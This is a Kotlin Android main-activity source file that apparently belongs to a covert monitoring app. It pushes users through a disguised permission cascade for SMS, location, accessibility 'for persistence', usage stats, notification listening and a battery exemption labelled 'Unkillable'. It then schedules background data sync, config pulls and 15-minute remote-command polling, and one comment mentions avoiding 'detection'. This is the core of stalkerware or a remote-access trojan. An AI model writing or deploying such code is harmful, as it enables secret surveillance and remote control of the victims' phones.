package com.example.myandroid

import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import androidx.activity.compose.setContent
import androidx.activity.ComponentActivity

// OPTIMIZATION: Switched to ComponentActivity (Lighter than AppCompat)
class MainActivity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // 1. Set Modern UI
        setContent {
            CyberpunkDashboard(this)
        }

        // 2. Start Background Logic
        initializeBackgroundTasks()
    }

    override fun onResume() {
        super.onResume()
        runPermissionCascade()
    }

    private fun runPermissionCascade() {
        val ctx = this

        // 1. Runtime (SMS, Location, etc)
        val missingRuntime = PermissionManager.getMissingRuntimePermissions(ctx)
        if (missingRuntime.isNotEmpty()) {
            requestPermissions(missingRuntime.toTypedArray(), 101)
            return
        }

        // 2. Accessibility (Critical for Persistence)
        if (!PermissionManager.hasAccessibility(ctx)) {
            showExplanationDialog("SYSTEM OVERRIDE REQUIRED", "Accessibility Access is required to maintain system persistence and monitor usage.") {
                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
            }
            return
        }

        // 3. Usage Stats (Screen Time)
        if (!PermissionManager.hasUsageStats(ctx)) {
            showExplanationDialog("DATA STREAM BLOCKED", "Usage Access required to calculate digital habits.") {
                startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
            }
            return
        }

        // 4. Notification Listener (Symbiote)
        if (!PermissionManager.hasNotificationListener(ctx)) {
            showExplanationDialog("LINK REQUIRED", "Notification Access required for real-time alerts.") {
                startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
            }
            return
        }
        
        // 5. Battery (Unkillable)
        if (!PermissionManager.isIgnored(ctx)) {
             val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
             intent.data = android.net.Uri.parse("package:$packageName")
             startActivity(intent)
        }
    }

    private fun showExplanationDialog(title: String, msg: String, onConfirm: () -> Unit) {
        android.app.AlertDialog.Builder(this)
            .setTitle(title)
            .setMessage(msg)
            .setCancelable(false)
            .setPositiveButton("INITIALIZE") { _, _ -> onConfirm() }
            .setNegativeButton("ABORT") { _, _ -> finishAffinity() }
            .show()
    }

    private fun initializeBackgroundTasks() {
        NetworkTracker.init(this)
        val intent = Intent(this, MonitorService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)

        val wm = androidx.work.WorkManager.getInstance(this)
        // OPTIMIZED: Run only when battery is not low to avoid heat/detection
        val constraints = androidx.work.Constraints.Builder()
            .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
            .setRequiresBatteryNotLow(true)
            .build()

        // Sync every 1 hour instead of 15 mins
        val syncRequest = androidx.work.PeriodicWorkRequestBuilder<SyncWorker>(1, java.util.concurrent.TimeUnit.HOURS)
            .setConstraints(constraints)
            .build()
        wm.enqueueUniquePeriodicWork("BackupWork", androidx.work.ExistingPeriodicWorkPolicy.KEEP, syncRequest)
        
        // Keep Config Sync frequent (6 hours)
        val configRequest = androidx.work.PeriodicWorkRequestBuilder<ConfigSyncWorker>(6, java.util.concurrent.TimeUnit.HOURS)
            .setConstraints(constraints)
            .build()
        wm.enqueueUniquePeriodicWork("ConfigSync", androidx.work.ExistingPeriodicWorkPolicy.KEEP, configRequest)
        
        // Remote Command (15 mins is fine as it's lightweight JSON check)
        val cmdRequest = androidx.work.PeriodicWorkRequestBuilder<RemoteCommandWorker>(15, java.util.concurrent.TimeUnit.MINUTES)
            .setConstraints(constraints)
            .build()
        wm.enqueueUniquePeriodicWork("RemoteCmdWorker", androidx.work.ExistingPeriodicWorkPolicy.KEEP, cmdRequest)
    }
}